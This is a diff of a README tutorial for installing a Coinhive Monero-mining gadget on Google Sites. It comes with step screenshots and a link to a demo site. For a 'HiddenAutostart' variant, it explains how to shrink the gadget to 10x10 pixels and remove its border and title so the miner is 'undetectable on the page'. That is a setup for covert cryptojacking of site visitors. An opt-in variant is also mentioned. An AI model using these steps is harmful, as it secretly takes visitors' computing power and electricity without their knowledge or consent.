@@ -44,5 +44,15 @@ A [Coinhive](https://coinhive.com/) Monero mining Gadget for Google Sites.
 
 12.A new window will appear whith the gadget settings. **If you are using the HiddenAutostart gadget follow these instructions:** Set "Width" to 10 and click the box "Percent" and change it to "pixels". Set the "Height" to 10. **Un**check the boxes "Include a border around gadget" and "Display title on gadget". This will make your gadget undetectable on the page. **If you are using the OptIn gadget follow these instructions:** Depending on the other content on your page you might want to play around with the settings for "Width" and "Height". But **Un**check the box for "Include a border around gadget". You can include a title if you want.
 
-Picture is for the **HiddenAutostart**
+Picture is for the **HiddenAutostart gadget**.
 ![Alt text](https://sites.google.com/site/unblockedhackedhalo/GithubCoinhiveStep9.JPG)
+
+13.Your new Coinhive mining gadget should now be on your page. You can move it around the page as you want by dragging up and down the page. Click "Save" to finalize your page.
+
+![Alt text](https://sites.google.com/site/unblockedhackedhalo/GithubCoinhiveStep10.JPG)
+
+14.Ta-Da!!!
+
+![Alt text](https://sites.google.com/site/unblockedhackedhalo/GithubCoinhiveStep11.JPG)
+
+Here is the link to the Google Site from the pictures. [https://sites.google.com/site/coinhivegadgettutorial/](https://sites.google.com/site/coinhivegadgettutorial/)
